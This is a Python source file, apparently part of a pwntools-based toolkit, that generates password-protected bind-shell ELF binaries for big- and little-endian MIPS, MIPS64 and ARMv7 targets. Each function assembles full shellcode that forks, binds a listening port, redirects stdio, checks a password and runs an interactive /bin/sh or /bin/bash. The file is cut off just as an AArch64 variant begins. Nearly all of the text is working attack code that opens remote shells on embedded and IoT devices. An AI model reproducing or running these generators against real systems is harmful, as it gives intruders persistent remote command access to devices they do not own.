from pwn import *
from . import my_package

from colorama import Fore,Back,Style


chars = my_package.chars


'''
mips_power_bind add 2023.1.19
'''

def mips_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=None):
	context.arch = 'mips'
	context.endian = 'big'
	context.bits = '32'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(8,"0")
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shell_path = "/bin/bash"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shell_path = "/bin/sh"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	
	shellcode = '''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
.set mips2
.set noreorder
	'''
	shellcode += shellcraft.fork()

	shellcode += '''
move  $s5, $v0
bnez $v0, main_lab
nop
	'''
	shellcode += shellcraft.socket(2,2,0)

	shellcode += '''

move $s7, $v0
	'''

	shellcode += shellcraft.setsockopt("$v0",0xffff,0x200,"$sp",4)

	shellcode +='''
addiu  $sp,$sp,-32
li $t7,0x7350
andi   $s0, $v0, 0xffff
addiu  $t6, $zero, -0x11
not    $t6, $t6
addiu  $t5, $zero, 0x2
sllv   $t5, $t5, $t6
addiu  $s4, $zero, %s
or     $t5, $t5, $s4
sw     $t5, -0x20($sp)
sw     $zero, -0x1c($sp)
sw     $zero, -0x18($sp)
sw     $zero, -0x14($sp)
move   $a0, $s7
addiu  $t6, $zero, -0x11
not    $a2, $t6
addi   $a1, $sp, -0x20
addiu  $v0, $zero, 0x1049
syscall 0x40404
addiu  $t7, $zero, 0x7350
move   $a0, $s7
addiu  $a1, $zero, 0x101
addiu  $v0, $zero, 0x104e
syscall 0x40404
addiu  $t7, $zero, 0x7350
move   $a0, $s7
slti   $a1, $zero, -1
slti   $a2, $zero, -1
addiu  $v0, $zero, 0x1048
syscall 0x40404
addiu  $t7, $zero, 0x7350
andi   $s0, $v0, 0xffff
or     $a0, $s0, $s0
addiu  $t7, $zero, -3
not    $a1, $t7
addiu  $v0, $zero, 0xfdf
syscall 0x40404
addiu  $t7, $zero, 0x7350
or     $a0, $s0, $s0
slti   $a1, $zero, 0x101
addiu  $v0, $zero, 0xfdf
syscall 0x40404
addiu  $t7, $zero, 0x7350
or     $a0, $s0, $s0
slti   $a1, $zero, -1
addiu  $v0, $zero, 0xfdf
syscall 0x40404
	'''
	#print(passwd)
	shellcode = shellcode%(listen_port)

	shellcode += shellcraft.write("$s0","Passwd: ",8)

	shellcode += "addiu  $sp, $sp, -0x40"

	shellcode += shellcraft.read("$s0","$sp",passwd_len)

	shellcode += "li $s3, %s\nlw $s1, ($sp)"%(passwd)

	shellcode += '''
bne  $s1, $s3, main_exit
nop
	'''

	shellcode += shellcraft.execve(shell_path, shell_path_list, envp)

	shellcode += '''
main_exit:
	'''

	shellcode += shellcraft.exit(0)

	shellcode += '''
main_lab:
	'''

	shellcode += shellcraft.wait4("$s5")

	shellcode += '''
j __start
nop

	'''
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 



def mipsel_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=None):
	context.arch = 'mips'
	context.endian = 'little'
	context.bits = '32'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(8,"0")
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shell_path = "/bin/bash"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shell_path = "/bin/sh"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	
	shellcode = '''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
.set mips2
.set noreorder
	'''
	shellcode += shellcraft.fork()

	shellcode += '''
move  $s5, $v0
bnez $v0, main_lab
nop
	'''
	shellcode += shellcraft.socket(2,2,0)

	shellcode += '''

move $s7, $v0
	'''

	shellcode += shellcraft.setsockopt("$v0",0xffff,0x200,"$sp",4)

	shellcode +='''
addiu  $sp,$sp,-32
li $t7,0x7350
andi   $s0, $v0, 0xffff
addiu  $t6, $zero, -0x11
not    $t6, $t6
addiu  $t5, $zero, %s
sllv   $t5, $t5, $t6
addiu  $t6, $zero, -0x3
not    $t6, $t6
or     $t5, $t5, $t6
sw     $t5, -0x20($sp)
sw     $zero, -0x1c($sp)
sw     $zero, -0x18($sp)
sw     $zero, -0x14($sp)
move   $a0, $s7
addiu  $t6, $zero, -0x11
not    $a2, $t6
addi   $a1, $sp, -0x20
addiu  $v0, $zero, 0x1049
syscall 0x40404
addiu  $t7, $zero, 0x7350
move   $a0, $s7
addiu  $a1, $zero, 0x101
addiu  $v0, $zero, 0x104e
syscall 0x40404
addiu  $t7, $zero, 0x7350
move   $a0, $s7
slti   $a1, $zero, -1
slti   $a2, $zero, -1
addiu  $v0, $zero, 0x1048
syscall 0x40404
addiu  $t7, $zero, 0x7350
andi   $s0, $v0, 0xffff
or     $a0, $s0, $s0
addiu  $t7, $zero, -3
not    $a1, $t7
addiu  $v0, $zero, 0xfdf
syscall 0x40404
addiu  $t7, $zero, 0x7350
or     $a0, $s0, $s0
slti   $a1, $zero, 0x101
addiu  $v0, $zero, 0xfdf
syscall 0x40404
addiu  $t7, $zero, 0x7350
or     $a0, $s0, $s0
slti   $a1, $zero, -1
addiu  $v0, $zero, 0xfdf
syscall 0x40404
	'''
	#print(passwd)
	shellcode = shellcode%(listen_port)

	shellcode += shellcraft.write("$s0","Passwd: ",8)

	shellcode += "addiu  $sp, $sp, -0x40"

	shellcode += shellcraft.read("$s0","$sp",passwd_len)

	shellcode += "li $s3, %s\nlw $s1, ($sp)"%(passwd)

	shellcode += '''
bne  $s1, $s3, main_exit
nop
	'''

	shellcode += shellcraft.execve(shell_path, shell_path_list, envp)

	shellcode += '''
main_exit:
	'''

	shellcode += shellcraft.exit(0)

	shellcode += '''
main_lab:
	'''

	shellcode += shellcraft.wait4("$s5")

	shellcode += '''
j __start
nop

	'''
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def mips64_power_bind_shell(shell_path, listen_port, passwd ,envp ,filename= None):
	context.arch = 'mips64'
	context.endian = 'big'
	context.bits = '64'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(8,"0")
	shellcode = '''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
	'''
	shellcode += '''
li $a0,0x1200012
xor $a1,$a1,$a1
xor $a2,$a2,$a2
xor $a3,$a3,$a3
li  $v0,0x13bf
syscall
move $s5, $v0
bnez $v0, main_lab
nop 

	'''
	shellcode_socket = '''
li      $t9, -3
nor     $a0, $t9, $zero
li      $t9, -3
nor     $a1, $t9, $zero
slti    $a2, $zero, -1
li      $v0, 0x13b0
syscall 0x40404
	'''

	shellcode += shellcode_socket

	shellcode += '''
move $s7, $v0
	'''

	shellcode += '''
li      $v0, 1
sw      $v0, 0($sp)
move    $v1, $sp
sw      $s7, 4($sp)
li      $a4, 4
move    $a3, $v1
li      $a2, 512
li      $a1, 0xffff
move    $a0, $s7
li      $v0, 5053
syscall 0x40404
	'''

	shellcode +='''
li      $t3,0x7350
andi    $s0,$v0,0xffff
li      $t2,-17
nor     $t2,$t2,$zero
li      $t1, -3
nor     $t1,$t1,$zero
sllv    $t1,$t1,$t2
li      $t2,%s
or      $t1,$t1,$t2
sw      $t1,-32($sp)
sw      $zero,-28($sp)
sw      $zero,-24($sp)
sw      $zero,-20($sp)
move     $a0, $s7
li      $t2,-17
nor     $a2,$t2,$zero
daddi   $a1,$sp,-32
li      $v0,0x13b8
syscall 0x40404
li      $t3,0x7350
move     $a0, $s7
li      $a1,2
li      $v0,0x13b9
syscall
li      $t3,0x7350
move     $a0, $s7
slti    $a1,$zero,-1
slti    $a2,$zero,-1
li      $v0,0x13b2
syscall 
li      $t3,0x7350
andi    $s0,$v0,0xffff
or      $a0,$s0,$s0 
li      $t2,-3 
nor     $a1,$t2,$zero 
li      $v0,0x13a8
syscall
li      $t3,0x7350
or      $a0,$s0,$s0
slti    $a1,$zero,0x0101
li      $v0,0x13a8
syscall
li      $t3,0x7350
or      $a0,$s0,$s0
slti    $a1,$zero,-1
li      $v0,0x13a8
syscall
	'''

	shellcode = shellcode%(listen_port)


	shellcode += '''
li $t1, 0x50617373
sw $t1, -12($sp)
li $t1, 0x77643a20
sw $t1, -8($sp)
sw $zero, -4($sp)
daddiu $sp, $sp, -12
dadd $a1, $sp, $0 /* mov $a1, $sp */
sw $s0, -4($sp) /* mov $a0, $s0 */
lw $a0, -4($sp)
li $t9, ~8
not $a2, $t9
/* call write() */
ori $v0, $zero, 0x1389
syscall 0x40404

daddiu $sp, $sp, -0x40

sw $s0, -4($sp) /* mov $a0, $s0 */
lw $a0, -4($sp)
dadd $a1, $sp, $0 /* mov $a1, $sp */
li $t9, ~%s
not $a2, $t9
/* call read() */
ori $v0, $zero, 0x1388
syscall 0x40404
li $s3, %s

lw $s1, ($sp)

bne  $s1, $s3, main_exit
nop
	'''	

	shellcode = shellcode%(passwd_len, passwd)


	if shell_path == "/bin/sh" or shell_path=="sh":
		shellcode +='''
li $t1, 0x2f62696e
sw $t1, -8($sp)
li $t9, ~0x2f736800
not $t1, $t9
sw $t1, -4($sp)
daddiu $sp, $sp, -8
daddiu $a0, $sp, 0 /* mov $a0, $sp */
/* push argument array ['/bin/sh\x00', '-i\x00'] */
/* push '/bin/sh\x00-i\x00\x00' */
li $t1, 0x2f62696e
sw $t1, -12($sp)
li $t9, ~0x2f736800
not $t1, $t9
sw $t1, -8($sp)
li $t9, ~0x2d690000
not $t1, $t9
sw $t1, -4($sp)
daddiu $sp, $sp, -12
slti $a1, $zero, 0xFFFF /* $a1 = 0 */
sd $a1, -8($sp)
daddiu $sp, $sp, -8 /* null terminate */
li $t9, ~0xc
not $a1, $t9
dadd $a1, $sp, $a1
dadd $a1, $a1, 4
sd $a1, -8($sp)
daddi $sp, $sp, -8 /* '-i\x00' */
li $t9, ~16
not $a1, $t9
dadd $a1, $sp, $a1
sd $a1, -8($sp)
daddiu $sp, $sp, -8 /* '/bin/sh\x00' */
daddiu $a1, $sp, 0 /* mov $a1, $sp */
slti $a2, $zero, 0xFFFF /* $a2 = 0 */
/* call execve() */
li $v0,0x13c1
syscall 0x40404

		'''
	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode += '''
li $t1, 0x2f62696e
sw $t1, -12($sp)
li $t1, 0x2f626173
sw $t1, -8($sp)
li $t9, ~0x68000000
not $t1, $t9
sw $t1, -4($sp)
daddiu $sp, $sp, -12
daddiu $a0, $sp, 0 /* mov $a0, $sp */
/* push argument array ['/bin/bash\x00', '-i\x00'] */
/* push '/bin/bash\x00-i\x00\x00' */
li $t1, 0x2f62696e
sw $t1, -16($sp)
li $t1, 0x2f626173
sw $t1, -12($sp)
li $t9, ~0x68002d69
not $t1, $t9
sw $t1, -8($sp)
sw $zero, -4($sp)
daddiu $sp, $sp, -12
slti $a1, $zero, 0xFFFF /* $a1 = 0 */
sd $a1, -8($sp)
daddiu $sp, $sp, -8 /* null terminate */
li $t9, ~0xe
not $a1, $t9
dadd $a1, $sp, $a1
sd $a1, -8($sp)
daddiu $sp, $sp, -8 /* '-i\x00' */
li $t9, ~16
not $a1, $t9
dadd $a1, $sp, $a1
sd $a1, -8($sp)
daddi $sp, $sp, -8 /* '/bin/bash\x00' */
dadd $a1, $sp, $0 /* mov $a1, $sp */
slti $a2, $zero, 0xFFFF /* $a2 = 0 */
/* call execve() */
li $v0,0x13c1
syscall 0x40404

		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)

	shellcode += '''
main_exit:
xor $a0, $a0, $a0
li  $v0, 0x01455
syscall
	'''
	
	shellcode += '''
main_lab:
move $a0,$s5
xor  $a1,$a1,$a1
xor  $a2,$a2,$a2
xor  $a3,$a3,$a3
li   $v0,0x13c3
syscall
j _start
nop

	'''

	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 





def mips64el_power_bind_shell(shell_path, listen_port, passwd ,envp ,filename= None):
	context.arch = 'mips64'
	context.endian = 'little'
	context.bits = '64'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(8,"0")
	shellcode = '''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
	'''
	shellcode += '''
li $a0,0x1200012
xor $a1,$a1,$a1
xor $a2,$a2,$a2
xor $a3,$a3,$a3
li  $v0,0x13bf
syscall
move $s5, $v0
bnez $v0, main_lab
nop 

	'''
	shellcode_socket = '''
li      $t9, -3
nor     $a0, $t9, $zero
li      $t9, -3
nor     $a1, $t9, $zero
slti    $a2, $zero, -1
li      $v0, 0x13b0
syscall 0x40404
	'''

	shellcode += shellcode_socket

	shellcode += '''
move $s7, $v0
	'''

	shellcode += '''
li      $v0, 1
sw      $v0, 0($sp)
move    $v1, $sp
sw      $s7, 4($sp)
li      $a4, 4
move    $a3, $v1
li      $a2, 512
li      $a1, 0xffff
move    $a0, $s7
li      $v0, 5053
syscall 0x40404
	'''
	shellcode += '''
li      $t3,0x7350
andi    $s0,$v0,0xffff
li      $t2,-17
nor     $t2,$t2,$zero
li      $t1, %s
sllv    $t1,$t1,$t2
li      $t2,-3
nor     $t2,$t2,$zero
or      $t1,$t1,$t2
sw      $t1,-32($sp)
sw      $zero,-28($sp)
sw      $zero,-24($sp)
sw      $zero,-20($sp)
move    $a0, $s7
li      $t2,-17
nor     $a2,$t2,$zero
daddi   $a1,$sp,-32
li      $v0,0x13b8
syscall 0x40404
li      $t3,0x7350
move    $a0, $s7
li      $a1,2
li      $v0,0x13b9
syscall
li      $t3,0x7350
move    $a0, $s7
slti    $a1,$zero,-1
slti    $a2,$zero,-1
li      $v0,0x13b2
syscall 
li      $t3,0x7350
andi    $s0,$v0,0xffff
or      $a0,$s0,$s0 
li      $t2,-3 
nor     $a1,$t2,$zero 
li      $v0,0x13a8
syscall
li      $t3,0x7350
or      $a0,$s0,$s0
slti    $a1,$zero,0x0101
li      $v0,0x13a8
syscall
li      $t3,0x7350
or      $a0,$s0,$s0
slti    $a1,$zero,-1
li      $v0,0x13a8
syscall
	'''

	shellcode = shellcode%(listen_port)

	shellcode += '''
li $t1, 0x73736150
sw $t1, -12($sp)
li $t1, 0x203a6477
sw $t1, -8($sp)
sw $zero, -4($sp)
daddiu $sp, $sp, -12
dadd $a1, $sp, $0 /* mov $a1, $sp */
sw $s0, -4($sp) /* mov $a0, $s0 */
lw $a0, -4($sp)
li $t9, ~8
not $a2, $t9
/* call write() */
ori $v0, $zero, 0x1389
syscall 0x40404

daddiu $sp, $sp, -0x40

sw $s0, -4($sp) /* mov $a0, $s0 */
lw $a0, -4($sp)
dadd $a1, $sp, $0 /* mov $a1, $sp */
li $t9, ~%s
not $a2, $t9
/* call read() */
ori $v0, $zero, 0x1388
syscall 0x40404
li $s3, %s

lw $s1, ($sp)

bne  $s1, $s3, main_exit
nop
	'''	

	shellcode = shellcode%(passwd_len, passwd)


	if shell_path == "/bin/sh" or shell_path=="sh":
		shellcode +='''
li $t1, 0x6e69622f
sw $t1, -8($sp)
li $t9, ~0x68732f
not $t1, $t9
sw $t1, -4($sp)
daddiu $sp, $sp, -8
daddiu $a0, $sp, 0 /* mov $a0, $sp */
/* push argument array ['/bin/sh\x00', '-i\x00'] */
/* push '/bin/sh\x00-i\x00\x00' */
li $t1, 0x6e69622f
sw $t1, -12($sp)
li $t9, ~0x68732f
not $t1, $t9
sw $t1, -8($sp)
ori $t1, $zero, 26925
sw $t1, -4($sp)
daddiu $sp, $sp, -12
slti $a1, $zero, 0xFFFF /* $a1 = 0 */
sd $a1, -8($sp)
daddiu $sp, $sp, -8 /* null terminate */
li $t9, ~0xc
not $a1, $t9
dadd $a1, $sp, $a1
dadd $a1, $a1, 4
sd $a1, -8($sp)
daddi $sp, $sp, -8 /* '-i\x00' */
li $t9, ~16
not $a1, $t9
dadd $a1, $sp, $a1
sd $a1, -8($sp)
daddiu $sp, $sp, -8 /* '/bin/sh\x00' */
daddiu $a1, $sp, 0 /* mov $a1, $sp */
slti $a2, $zero, 0xFFFF /* $a2 = 0 */
/* call execve() */
li $v0,0x13c1
syscall 0x40404

		'''
	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode  += '''
li $t1, 0x6e69622f
sw $t1, -12($sp)
li $t1, 0x7361622f
sw $t1, -8($sp)
li $t9, ~0x68
not $t1, $t9
sw $t1, -4($sp)
daddiu $sp, $sp, -12
daddiu $a0, $sp, 0 /* mov $a0, $sp */
/* push argument array ['/bin/bash\x00', '-i\x00'] */
/* push '/bin/bash\x00-i\x00\x00' */
li $t1, 0x6e69622f
sw $t1, -16($sp)
li $t1, 0x7361622f
sw $t1, -12($sp)
li $t9, ~0x692d0068
not $t1, $t9
sw $t1, -8($sp)
sw $zero, -4($sp)
daddiu $sp, $sp, -12
slti $a1, $zero, 0xFFFF /* $a1 = 0 */
sd $a1, -8($sp)
daddiu $sp, $sp, -8 /* null terminate */
li $t9, ~0xe
not $a1, $t9
dadd $a1, $sp, $a1
sd $a1, -8($sp)
daddiu $sp, $sp, -8 /* '-i\x00' */
li $t9, ~16
not $a1, $t9
dadd $a1, $sp, $a1
sd $a1, -8($sp)
daddi $sp, $sp, -8 /* '/bin/bash\x00' */
dadd $a1, $sp, $0 /* mov $a1, $sp */
slti $a2, $zero, 0xFFFF /* $a2 = 0 */
/* call execve() */
li $v0,0x13c1
syscall 0x40404

		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode += '''
main_exit:
xor $a0, $a0, $a0
li  $v0, 0x01455
syscall 0x40404
	'''
	
	shellcode += '''
main_lab:
move $a0,$s5
xor  $a1,$a1,$a1
xor  $a2,$a2,$a2
xor  $a3,$a3,$a3
li   $v0,0x13c3
syscall 0x40404
j _start
nop

	'''
	
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 



def armelv7_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=None):
	context.arch = 'arm'
	context.endian = 'little'
	context.bits = '32'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(8,"0")
	passwd_high = passwd[:6]
	passwd_low  = "0x"+passwd[6:10]
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shell_path = "/bin/bash"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shell_path = "/bin/sh"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode = '''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
.syntax unified
.arch armv7-a
	'''

	shellcode += shellcraft.fork()

	shellcode += '''
mov r8,r0
cmp r8,#0
bne main_lab
	'''

	shellcode += shellcraft.socket(2,1,0)

	shellcode += '''
mov r6, r0
	'''

	shellcode += shellcraft.setsockopt("r0",1,0xf,"sp",4)

	shellcode += '''
eor  r2, r2, r2
mov  r0, r6
movw r7, #2
movt r7, #%s
push {r2}
push {r7}
mov  r1,sp
mov  r2,#0x10  
movw r7, 0x11a
svc #0
mov r0,r6
eor r1,r1
movw r7,#284
svc #0
mov r0,r6
eor r2,r2
movw r7, 0x11d
svc #0
mov r6,r0

mov r1,#2
mov r0,r6
mov r7,#63
svc #0
sub r1, r1, #1
mov r0, r6
mov r7,#63
svc #0
sub r1, r1, #1
mov r0, r6
mov r7, 63
svc #0



movw r7, #0x41414100 & 0xffff
movt r7, #0x41414100 >> 16
push {r7}
movw r7, #0x203a6477 & 0xffff
movt r7, #0x203a6477 >> 16
push {r7}
movw r7, #0x73736150 & 0xffff
movt r7, #0x73736150 >> 16
push {r7}
mov  r1, sp
mov  r0, r6
mov  r2, #8
/* call write() */
mov  r7, #SYS_write /* 4 */
svc  #0
sub  sp, 0x20
mov  r0, r6
mov  r1, sp
mov  r2, #%s
mov  r7, #3
svc  #0
mov  r7,sp
ldr  r7,[r7]
movw r5,#%s
movt r5,#%s
cmp  r7,r5
bne  main_exit
	'''

	shellcode = shellcode%(listen_port, passwd_len ,passwd_low ,passwd_high)

	shellcode += '''
bne main_exit
	'''

	shellcode += shellcraft.execve(shell_path, shell_path_list, envp)
	
	shellcode += '''
main_exit:
	'''

	shellcode += shellcraft.exit(0)

	shellcode += '''
main_lab:
	'''

	shellcode += shellcraft.wait4("r3")

	shellcode += '''
b __start
nop

	'''
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


	

def armebv7_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=None):
	context.arch = 'arm'
	context.endian = 'big'
	context.bits = '32'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).ljust(8,"0")
	passwd_high = passwd[:6]
	passwd_low  = "0x"+passwd[6:10]

	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shell_path = "/bin/bash"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shell_path = "/bin/sh"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode = '''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
.syntax unified
.arch armv7-a
	'''

	shellcode += shellcraft.fork()

	shellcode += '''
mov r8,r0
cmp r8,#0
bne main_lab
	'''

	shellcode += shellcraft.socket(2,1,0)

	shellcode += '''
mov r6, r0
	'''

	shellcode += shellcraft.setsockopt("r0",1,0xf,"sp",4)

	shellcode += '''
eor  r2, r2, r2
mov  r0, r6
movw r7, #%s
movt r7, #2
push {r2}
push {r7}
mov  r1,sp
mov  r2,#0x10  
movw r7, 0x11a
svc #0
mov r0,r6
eor r1,r1
movw r7,#284
svc #0
mov r0,r6
eor r2,r2
movw r7, 0x11d
svc #0
mov r6,r0

mov r1,#2
mov r0,r6
mov r7,#63
svc #0
sub r1, r1, #1
mov r0, r6
mov r7,#63
svc #0
sub r1, r1, #1
mov r0, r6
mov r7, 63
svc #0

movw r7, #0x414141 & 0xffff
movt r7, #0x414141 >> 16
push {r7}
movw r7, #0x77643a20 & 0xffff
movt r7, #0x77643a20 >> 16
push {r7}
movw r7, #0x50617373 & 0xffff
movt r7, #0x50617373 >> 16
push {r7}
mov  r1, sp
mov  r2, #8
/* call write() */
mov  r7, #SYS_write /* 4 */
svc  0
sub  sp, 0x20
mov  r0, r6
mov  r1, sp
mov  r2, #%s
mov  r7, #3
svc  #0
mov  r7,sp
ldr  r7,[r7]
movw r5,#%s
movt r5,#%s
cmp  r7,r5
bne  main_exit
	'''

	shellcode = shellcode%(listen_port, passwd_len ,passwd_low ,passwd_high)

	shellcode += '''
bne main_exit
	'''

	shellcode += shellcraft.execve(shell_path, shell_path_list, envp)
	
	shellcode += '''
main_exit:
	'''

	shellcode += shellcraft.exit(0)

	shellcode += '''
main_lab:
	'''

	shellcode += shellcraft.wait4("r8")

	shellcode += '''
b __start
nop

	'''

	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def aarch64_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=None):
	context.arch = 'aarch64'
	context.endian = 'little'
